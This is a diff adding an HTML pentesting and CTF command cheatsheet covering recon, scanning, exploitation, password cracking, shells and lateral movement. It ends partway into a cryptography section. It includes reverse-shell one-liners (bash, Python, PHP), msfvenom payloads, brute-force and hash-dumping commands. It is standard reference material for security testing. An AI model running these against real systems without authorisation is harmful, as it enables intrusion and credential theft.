@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cyber Cheatsheet — Pentesting & Security Tools</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap');
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #09090b;
+      color: #e4e4e7;
+      line-height: 1.6;
+    }
+
+    ::selection { background: #22c55e44; color: #fff; }
+
+    .bg-grid {
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(34, 197, 94, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(34, 197, 94, 0.03) 1px, transparent 1px);
+      background-size: 50px 50px;
+      pointer-events: none; z-index: 0;
+    }
+
+    .bg-glow {
+      position: fixed;
+      top: -30%; right: -20%;
+      width: 700px; height: 700px;
+      background: radial-gradient(circle, rgba(34,197,94,0.06), transparent 70%);
+      pointer-events: none; z-index: 0;
+    }
+
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: rgba(9,9,11,0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid rgba(255,255,255,0.04);
+      padding: 14px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    nav .logo {
+      font-weight: 800; font-size: 1.1em;
+      display: flex; align-items: center; gap: 8px;
+    }
+    nav .logo span { color: #22c55e; }
+    nav .badge {
+      font-size: 0.7em;
+      background: rgba(34,197,94,0.1);
+      color: #22c55e;
+      padding: 3px 10px;
+      border-radius: 100px;
+      border: 1px solid rgba(34,197,94,0.1);
+    }
+
+    .hero {
+      position: relative; z-index: 1;
+      max-width: 1000px; margin: 0 auto;
+      padding: 60px 24px 40px;
+      text-align: center;
+    }
+    .hero h1 {
+      font-size: clamp(2.2em, 5vw, 3.5em);
+      font-weight: 900;
+      letter-spacing: -0.03em;
+    }
+    .hero h1 span { color: #22c55e; }
+    .hero p {
+      color: #71717a;
+      font-size: 1em;
+      max-width: 550px;
+      margin: 10px auto 0;
+    }
+
+    .toc {
+      position: relative; z-index: 1;
+      max-width: 1000px; margin: 0 auto;
+      padding: 0 24px 30px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      justify-content: center;
+    }
+    .toc a {
+      color: #a1a1aa;
+      text-decoration: none;
+      font-size: 0.82em;
+      padding: 5px 14px;
+      border-radius: 100px;
+      border: 1px solid rgba(255,255,255,0.06);
+      transition: all 0.2s;
+    }
+    .toc a:hover {
+      border-color: rgba(34,197,94,0.2);
+      color: #22c55e;
+      background: rgba(34,197,94,0.04);
+    }
+
+    .container {
+      position: relative; z-index: 1;
+      max-width: 1000px; margin: 0 auto;
+      padding: 0 24px 80px;
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 24px;
+    }
+
+    .section-card {
+      background: rgba(255,255,255,0.02);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 16px;
+      padding: 24px;
+      transition: border-color 0.3s;
+    }
+    .section-card:hover { border-color: rgba(255,255,255,0.1); }
+
+    .section-card h2 {
+      font-size: 1.1em;
+      font-weight: 700;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .section-card h2 .emoji { font-size: 1.2em; }
+
+    .cmd-grid { display: grid; gap: 10px; }
+
+    .cmd {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 10px;
+      overflow: hidden;
+      transition: background 0.2s;
+    }
+    .cmd:hover { background: rgba(255,255,255,0.04); }
+
+    .cmd-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .cmd-title {
+      font-size: 0.9em;
+      font-weight: 600;
+      color: #e4e4e7;
+    }
+    .cmd-desc {
+      font-size: 0.8em;
+      color: #71717a;
+      margin-top: 2px;
+    }
+
+    .cmd-body {
+      padding: 0 16px 14px;
+    }
+    .cmd-body pre {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82em;
+      background: rgba(0,0,0,0.3);
+      border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 8px;
+      padding: 12px 14px;
+      overflow-x: auto;
+      color: #a1a1aa;
+      position: relative;
+    }
+    .cmd-body pre .kw { color: #22c55e; }
+    .cmd-body pre .fl { color: #facc15; }
+    .cmd-body pre .str { color: #f97316; }
+    .cmd-body pre .cm { color: #52525b; font-style: italic; }
+    .cmd-body pre .var { color: #60a5fa; }
+    .cmd-body pre .arrow { color: #52525b; }
+
+    .copy-btn {
+      position: absolute;
+      top: 6px; right: 6px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.06);
+      color: #71717a;
+      padding: 3px 8px;
+      border-radius: 5px;
+      font-size: 0.75em;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .copy-btn:hover {
+      background: rgba(34,197,94,0.1);
+      border-color: rgba(34,197,94,0.2);
+      color: #22c55e;
+    }
+
+    footer {
+      position: relative; z-index: 1;
+      text-align: center;
+      padding: 30px 24px 40px;
+      border-top: 1px solid rgba(255,255,255,0.04);
+      max-width: 1000px; margin: 0 auto;
+    }
+    footer p { color: #52525b; font-size: 0.8em; }
+    footer a { color: #71717a; text-decoration: none; }
+    footer a:hover { color: #22c55e; }
+
+    @media (max-width: 600px) {
+      .hero { padding: 40px 20px 30px; }
+      .section-card { padding: 18px; }
+      .cmd-header { padding: 10px 14px; }
+      .cmd-body { padding: 0 14px 12px; }
+      .cmd-body pre { font-size: 0.75em; padding: 10px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow"></div>
+
+<nav>
+  <div class="logo">⚡<span>cyber-cheatsheet</span></div>
+  <span class="badge">v1.0</span>
+</nav>
+
+<section class="hero">
+  <h1>cybersecurity <span>tools</span> cheatsheet</h1>
+  <p>Quick commands for the most common pentesting and CTF tools. Bookmark it.</p>
+</section>
+
+<div class="toc">
+  <a href="#recon">Recon</a>
+  <a href="#scanning">Scanning</a>
+  <a href="#web">Web</a>
+  <a href="#exploit">Exploitation</a>
+  <a href="#password">Password</a>
+  <a href="#shells">Shells</a>
+  <a href="#lateral">Lateral</a>
+  <a href="#crypto">Crypto</a>
+  <a href="#misc">Misc</a>
+</div>
+
+<div class="container">
+
+  <!-- Recon -->
+  <div class="section-card" id="recon">
+    <h2><span class="emoji">🔍</span> Reconnaissance</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">nmap — Basic scan</div><div class="cmd-desc">Fast port scan on target</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nmap</span> <span class="fl">-sS -sV -O</span> <span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">nmap — All ports + scripts</div><div class="cmd-desc">Full TCP scan with default scripts</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nmap</span> <span class="fl">-p- -sC -sV -T4</span> <span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">nmap — UDP scan</div><div class="cmd-desc">Common UDP ports</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nmap</span> <span class="fl">-sU --top-ports 100</span> <span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">nmap — Output to all formats</div><div class="cmd-desc">Normal, XML, grepable</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nmap</span> <span class="fl">-oA</span> <span class="var">scan_output</span> <span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">whois</div><div class="cmd-desc">Domain registration info</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">whois</span> <span class="var">&lt;domain&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">dnsrecon</div><div class="cmd-desc">DNS enumeration</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">dnsrecon</span> <span class="fl">-d</span> <span class="var">&lt;domain&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">dig — TXT records</div><div class="cmd-desc">Check SPF, DKIM, DMARC</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">dig</span> <span class="var">&lt;domain&gt;</span> <span class="fl">TXT</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Scanning -->
+  <div class="section-card" id="scanning">
+    <h2><span class="emoji">📡</span> Scanning & Enumeration</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">gobuster — Directory bruteforce</div><div class="cmd-desc">Common web directories</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">gobuster</span> <span class="fl">dir -u</span> <span class="var">&lt;url&gt;</span> <span class="fl">-w</span> <span class="var">/usr/share/wordlists/dirb/common.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">gobuster — Subdomains</div><div class="cmd-desc">DNS subdomain enumeration</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">gobuster</span> <span class="fl">dns -d</span> <span class="var">&lt;domain&gt;</span> <span class="fl">-w</span> <span class="var">&lt;wordlist&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">ffuf — Fast web fuzzing</div><div class="cmd-desc">Directory busting with filters</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">ffuf</span> <span class="fl">-u</span> <span class="var">&lt;url&gt;</span><span class="fl">/FUZZ -w</span> <span class="var">&lt;wordlist&gt;</span> <span class="fl">-mc</span> <span class="var">200,301,302</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">ffuf — Recursive</div><div class="cmd-desc">Deep directory bruteforce</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">ffuf</span> <span class="fl">-recursion -recursion-depth</span> <span class="var">3</span> <span class="fl">-u</span> <span class="var">&lt;url&gt;</span><span class="fl">/FUZZ -w</span> <span class="var">&lt;wordlist&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">nikto</div><div class="cmd-desc">Web server vulnerability scan</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nikto</span> <span class="fl">-h</span> <span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">whatweb</div><div class="cmd-desc">CMS, framework, version detection</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">whatweb</span> <span class="var">&lt;url&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">wpscan</div><div class="cmd-desc">WordPress vulnerability scanner</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">wpscan</span> <span class="fl">--url</span> <span class="var">&lt;url&gt;</span> <span class="fl">--enumerate</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Web -->
+  <div class="section-card" id="web">
+    <h2><span class="emoji">🌐</span> Web Exploitation</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">sqlmap — Basic</div><div class="cmd-desc">Auto-detect and exploit SQLi</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">sqlmap</span> <span class="fl">-u</span> <span class="str">"<span class="var">&lt;url&gt;</span>?param=1"</span> <span class="fl">--batch</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">sqlmap — Dump database</div><div class="cmd-desc">Extract all tables</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">sqlmap</span> <span class="fl">-u</span> <span class="str">"<span class="var">&lt;url&gt;</span>?param=1"</span> <span class="fl">--dump --batch</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">curl — Basic request</div><div class="cmd-desc">View response headers and body</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">curl</span> <span class="fl">-iv</span> <span class="var">&lt;url&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">curl — POST with data</div><div class="cmd-desc">Send form/data to endpoint</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">curl</span> <span class="fl">-X POST -d</span> <span class="str">"user=admin&pass=test"</span> <span class="var">&lt;url&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">curl — Custom headers</div><div class="cmd-desc">Add auth cookies, user-agent</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">curl</span> <span class="fl">-H</span> <span class="str">"Authorization: Bearer &lt;token&gt;"</span> <span class="fl">-H</span> <span class="str">"User-Agent: Mozilla/5.0"</span> <span class="var">&lt;url&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Exploitation -->
+  <div class="section-card" id="exploit">
+    <h2><span class="emoji">💥</span> Exploitation Frameworks</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">msfconsole — Search + Use</div><div class="cmd-desc">Find and load an exploit</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">msfconsole</span>
+<span class="kw">search</span> <span class="var">&lt;cve or name&gt;</span>
+<span class="kw">use</span> <span class="var">&lt;module&gt;</span>
+<span class="kw">show options</span>
+<span class="kw">set</span> <span class="var">RHOSTS</span> <span class="fl">&lt;target&gt;</span>
+<span class="kw">run</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">msfvenom — Reverse shell payload</div><div class="cmd-desc">Generate staged payload</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">msfvenom</span> <span class="fl">-p</span> <span class="var">linux/x64/shell_reverse_tcp</span> <span class="fl">LHOST=</span><span class="var">&lt;ip&gt;</span> <span class="fl">LPORT=</span><span class="var">&lt;port&gt;</span> <span class="fl">-f elf -o</span> <span class="var">payload.elf</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">msfvenom — Windows meterpreter</div><div class="cmd-desc">Meterpreter reverse TCP</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">msfvenom</span> <span class="fl">-p</span> <span class="var">windows/x64/meterpreter_reverse_tcp</span> <span class="fl">LHOST=</span><span class="var">&lt;ip&gt;</span> <span class="fl">LPORT=</span><span class="var">&lt;port&gt;</span> <span class="fl">-f exe -o</span> <span class="var">payload.exe</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">msfvenom — Web shell</div><div class="cmd-desc">PHP reverse shell</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">msfvenom</span> <span class="fl">-p</span> <span class="var">php/reverse_php</span> <span class="fl">LHOST=</span><span class="var">&lt;ip&gt;</span> <span class="fl">LPORT=</span><span class="var">&lt;port&gt;</span> <span class="fl">-o</span> <span class="var">shell.php</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">searchsploit</div><div class="cmd-desc">Search Exploit-DB locally</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">searchsploit</span> <span class="var">&lt;keyword&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Password -->
+  <div class="section-card" id="password">
+    <h2><span class="emoji">🔑</span> Password Cracking</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hashcat — Identify hash</div><div class="cmd-desc">Auto-detect hash type</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hashcat</span> <span class="fl">--identify</span> <span class="var">hash.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hashcat — Dictionary attack</div><div class="cmd-desc">MD5 with rockyou</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hashcat</span> <span class="fl">-m</span> <span class="var">0</span> <span class="fl">-a</span> <span class="var">0</span> <span class="var">hash.txt</span> <span class="var">/usr/share/wordlists/rockyou.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hashcat — NTLM</div><div class="cmd-desc">Windows NTLM hash</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hashcat</span> <span class="fl">-m</span> <span class="var">1000</span> <span class="fl">-a</span> <span class="var">0</span> <span class="var">hash.txt</span> <span class="var">/usr/share/wordlists/rockyou.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hashcat — bcrypt</div><div class="cmd-desc">Slow hash, low speed expected</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hashcat</span> <span class="fl">-m</span> <span class="var">3200</span> <span class="fl">-a</span> <span class="var">0</span> <span class="var">hash.txt</span> <span class="var">/usr/share/wordlists/rockyou.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">john — Unshadow</div><div class="cmd-desc">Combine passwd + shadow for cracking</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">unshadow</span> <span class="var">passwd</span> <span class="var">shadow</span> <span class="arrow">></span> <span class="var">hashes.txt</span>
+<span class="kw">john</span> <span class="fl">--wordlist=</span><span class="var">/usr/share/wordlists/rockyou.txt</span> <span class="var">hashes.txt</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hydra — SSH brute force</div><div class="cmd-desc">SSH password attack</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hydra</span> <span class="fl">-l</span> <span class="var">&lt;user&gt;</span> <span class="fl">-P</span> <span class="var">&lt;wordlist&gt;</span> <span class="var">&lt;target&gt;</span> <span class="fl">ssh</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">hydra — Web form</div><div class="cmd-desc">POST login bruteforce</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">hydra</span> <span class="fl">-l</span> <span class="var">&lt;user&gt;</span> <span class="fl">-P</span> <span class="var">&lt;wordlist&gt;</span> <span class="var">&lt;target&gt;</span> <span class="fl">http-post-form</span> <span class="str">"/path:user=^USER^&pass=^PASS^:F=incorrect"</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Shells -->
+  <div class="section-card" id="shells">
+    <h2><span class="emoji">🐚</span> Reverse Shells & Listeners</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">netcat — Listener</div><div class="cmd-desc">Basic reverse shell listener</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">nc</span> <span class="fl">-lvnp</span> <span class="var">&lt;port&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">Bash reverse shell</div><div class="cmd-desc">One-liner for Linux targets</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">bash</span> <span class="fl">-c</span> <span class="str">'bash -i >& /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0>&1'</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">Python reverse shell</div><div class="cmd-desc">Python3 one-liner</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">python3</span> <span class="fl">-c</span> <span class="str">'import socket,subprocess,os;s=socket.socket();s.connect(("&lt;ip&gt;",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">PHP reverse shell</div><div class="cmd-desc">Web shell via PHP</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">php</span> <span class="fl">-r</span> <span class="str">'$s=fsockopen("&lt;ip&gt;",&lt;port&gt;);exec("/bin/sh -i <&3 >&3 2>&3");'</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">Python HTTP server</div><div class="cmd-desc">Quick file transfer server</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">python3</span> <span class="fl">-m http.server</span> <span class="var">&lt;port&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">socat — Full TTY</div><div class="cmd-desc">Fully interactive TTY shell</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="cm"># listener:</span>
+<span class="kw">socat</span> <span class="fl">file:`tty`,raw,echo=0</span> <span class="fl">TCP-LISTEN:</span><span class="var">&lt;port&gt;</span>
+<span class="cm"># target:</span>
+<span class="kw">socat</span> <span class="fl">exec:'bash -li',pty,stderr,setsid,sigint,sane</span> <span class="fl">TCP:</span><span class="var">&lt;ip&gt;</span><span class="fl">:</span><span class="var">&lt;port&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">Upgrade shell — Python</div><div class="cmd-desc">PTY upgrade after netcat</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">python3</span> <span class="fl">-c</span> <span class="str">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="fl">Ctrl+Z</span>
+<span class="kw">stty</span> <span class="fl">raw -echo; fg</span>
+<span class="kw">reset</span><span class="cm">; export TERM=xterm</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Lateral -->
+  <div class="section-card" id="lateral">
+    <h2><span class="emoji">🔄</span> Lateral Movement</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">impacket — psexec</div><div class="cmd-desc">Execute as admin on Windows</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">impacket-psexec</span> <span class="var">&lt;domain&gt;</span><span class="fl">/</span><span class="var">&lt;user&gt;</span><span class="fl">:</span><span class="var">&lt;pass&gt;</span><span class="fl">@</span><span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">impacket — wmiexec</div><div class="cmd-desc">WMI execution (subtle)</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">impacket-wmiexec</span> <span class="var">&lt;domain&gt;</span><span class="fl">/</span><span class="var">&lt;user&gt;</span><span class="fl">:</span><span class="var">&lt;pass&gt;</span><span class="fl">@</span><span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">impacket — secretsdump</div><div class="cmd-desc">Dump hashes from DC</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">impacket-secretsdump</span> <span class="var">&lt;domain&gt;</span><span class="fl">/</span><span class="var">&lt;user&gt;</span><span class="fl">:</span><span class="var">&lt;pass&gt;</span><span class="fl">@</span><span class="var">&lt;target&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">evil-winrm</div><div class="cmd-desc">WinRM shell session</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">evil-winrm</span> <span class="fl">-i</span> <span class="var">&lt;target&gt;</span> <span class="fl">-u</span> <span class="var">&lt;user&gt;</span> <span class="fl">-p</span> <span class="var">&lt;pass&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">smbclient</div><div class="cmd-desc">List SMB shares anonymously</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">smbclient</span> <span class="fl">-L //</span><span class="var">&lt;target&gt;</span> <span class="fl">-N</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">ssh — Tunnel</div><div class="cmd-desc">Local port forward through SSH</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">ssh</span> <span class="fl">-L</span> <span class="var">&lt;local_port&gt;</span><span class="fl">:</span><span class="var">&lt;remote_host&gt;</span><span class="fl">:</span><span class="var">&lt;remote_port&gt;</span> <span class="var">&lt;user&gt;</span><span class="fl">@</span><span class="var">&lt;jump_host&gt;</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Crypto -->
+  <div class="section-card" id="crypto">
+    <h2><span class="emoji">🔐</span> Cryptography & Encoding</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">openssl — Generate RSA key pair</div><div class="cmd-desc">2048-bit private/public</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">openssl</span> <span class="fl">genrsa -out</span> <span class="var">private.pem</span> <span class="var">2048</span>
+<span class="kw">openssl</span> <span class="fl">rsa -in</span> <span class="var">private.pem</span> <span class="fl">-pubout ></span> <span class="var">public.pem</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">openssl — Self-signed cert</div><div class="cmd-desc">For HTTPS testing</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">openssl</span> <span class="fl">req -x509 -newkey</span> <span class="var">rsa:2048</span> <span class="fl">-keyout</span> <span class="var">key.pem</span> <span class="fl">-out</span> <span class="var">cert.pem</span> <span class="fl">-days</span> <span class="var">365</span> <span class="fl">-nodes</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
